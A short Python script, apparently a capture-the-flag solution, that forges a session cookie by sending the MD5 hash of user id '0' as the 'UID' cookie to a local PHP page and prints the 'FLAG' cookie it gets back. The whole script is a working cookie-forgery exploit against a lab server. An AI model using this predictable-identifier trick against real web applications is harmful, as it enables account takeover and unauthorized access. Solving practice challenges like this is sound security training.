from hashlib import md5
from urllib.parse import unquote

from requests import get as get_request

uid_bytes = str(0).encode("utf-8")
uid_md5 = md5(uid_bytes).hexdigest()

url = "http://127.0.0.1:8080/index.php"
response = get_request(url, cookies={"UID": uid_md5})
print(unquote(response.cookies.get("FLAG")))
